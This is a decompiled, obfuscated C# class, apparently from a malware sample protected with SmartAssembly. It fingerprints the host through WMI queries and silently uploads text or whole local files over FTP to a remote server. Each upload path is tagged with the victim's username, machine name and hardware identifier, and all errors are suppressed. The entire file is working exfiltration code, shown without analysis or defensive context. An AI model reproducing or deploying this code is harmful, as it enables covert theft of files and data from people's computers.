using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace UmXkJLRjSLdPF;

internal sealed class VBbJbUVgwpdJ
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string YXbFzRisMhzfZ()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		ManagementClass val = new ManagementClass(getString_0(107368384));
		ManagementObjectCollection instances = val.GetInstances();
		ManagementObjectEnumerator enumerator = instances.GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107368363)).get_Value()
					.ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		string text2 = getString_0(107368314);
		ManagementObject val3 = new ManagementObject(getString_0(107368309) + text2 + getString_0(107368300));
		val3.Get();
		string text3 = ((ManagementBaseObject)val3).get_Item(getString_0(107368295)).ToString();
		return text3 + text;
	}

	public static void TUosUfZTvyLU(string WTDKZzPURPDvCyzU = "URL", string MsSLJPJjBlWy = "USERNAME", string dNJElGhSjcE = "ACCESO", string HvgLWHMzNdryby = "")
	{
		try
		{
			string text = YXbFzRisMhzfZ();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(WTDKZzPURPDvCyzU + getString_0(107372235) + Environment.UserName + getString_0(107372190) + Environment.MachineName + getString_0(107372201) + text + getString_0(107372196));
			ftpWebRequest.Method = getString_0(107368270);
			ftpWebRequest.Credentials = new NetworkCredential(MsSLJPJjBlWy, dNJElGhSjcE);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(HvgLWHMzNdryby);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void AfJGmWRnzBVUU(string ptkaxkAUZBgi = "URL", string oMCWVYYZvB = "USERNAME", string fjDONIDlETzq = "ACCESO", string frLpkBklgexqiY = "")
	{
		try
		{
			string text = YXbFzRisMhzfZ();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(ptkaxkAUZBgi + getString_0(107372235) + Environment.UserName + getString_0(107372190) + Environment.MachineName + getString_0(107372201) + text + getString_0(107372201) + Path.GetFileName(frLpkBklgexqiY));
			ftpWebRequest.Method = getString_0(107368270);
			ftpWebRequest.Credentials = new NetworkCredential(oMCWVYYZvB, fjDONIDlETzq);
			byte[] array = File.ReadAllBytes(frLpkBklgexqiY);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static VBbJbUVgwpdJ()
	{
		Strings.CreateGetStringDelegate(typeof(VBbJbUVgwpdJ));
	}
}
